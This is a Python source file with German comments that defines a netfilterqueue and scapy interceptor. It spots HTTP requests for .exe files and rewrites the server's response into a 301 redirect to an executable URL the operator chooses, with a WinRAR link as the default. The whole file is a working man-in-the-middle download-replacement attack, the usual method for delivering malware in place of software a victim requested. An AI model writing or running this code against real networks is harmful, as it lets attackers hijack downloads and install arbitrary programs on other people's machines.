import netfilterqueue
import scapy.all as scapy
import logging

class ConnectionFilter:
    def __init__(self, queue_num=0, filter_func=None, redirect_url=None):
        """
        :param queue_num: NetfilterQueue Nummer
        :param filter_func: Funktion, die scapy.IP-Paket bekommt und bool zurückgibt, ob verarbeitet werden soll
        :param redirect_url: URL für HTTP Redirect (bytes oder str)
        """
        self.queue_num = queue_num
        self.filter_func = filter_func
        self.ack_list = []
        self.redirect_url = redirect_url.encode() if isinstance(redirect_url, str) else redirect_url
        self.queue = netfilterqueue.NetfilterQueue()

    def set_load(self, packet, load):
        packet = packet.copy()
        if packet.haslayer(scapy.Raw):
            packet[scapy.Raw].load = load
        else:
            packet = packet / scapy.Raw(load)
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    def process_packet(self, packet):
        try:
            scapy_packet = scapy.IP(packet.get_payload())
        except Exception as e:
            logging.debug(f"Fehler beim Parsen des Pakets: {e}")
            packet.accept()
            return

        if self.filter_func and not self.filter_func(scapy_packet):
            packet.accept()
            return

        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            payload = scapy_packet[scapy.Raw].load

            if scapy_packet[scapy.TCP].dport == 80:
                if b".exe" in payload:
                    logging.info(f"Exe Request erkannt von {scapy_packet[scapy.IP].src}")
                    self.ack_list.append(scapy_packet[scapy.TCP].ack)

            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in self.ack_list:
                    self.ack_list.remove(scapy_packet[scapy.TCP].seq)
                    logging.info(f"Ersetze EXE Download mit Redirect für {scapy_packet[scapy.IP].dst}")

                    redirect_location = self.redirect_url or b"https://www.rarlab.com/rar/winrar-x64-59b3.exe"

                    redirect_payload = (
                        b"HTTP/1.1 301 Moved Permanently\r\n"
                        b"Location: " + redirect_location + b"\r\n"
                        b"Content-Length: 0\r\n"
                        b"Connection: close\r\n\r\n"
                    )

                    modified_packet = self.set_load(scapy_packet, redirect_payload)
                    packet.set_payload(bytes(modified_packet))

        packet.accept()

    def run(self):
        self.queue.bind(self.queue_num, self.process_packet)
        try:
            logging.info(f"Starte NetfilterQueue {self.queue_num}")
            self.queue.run()
        except KeyboardInterrupt:
            logging.info("Beendet durch Benutzer")
        finally:
            self.queue.unbind()
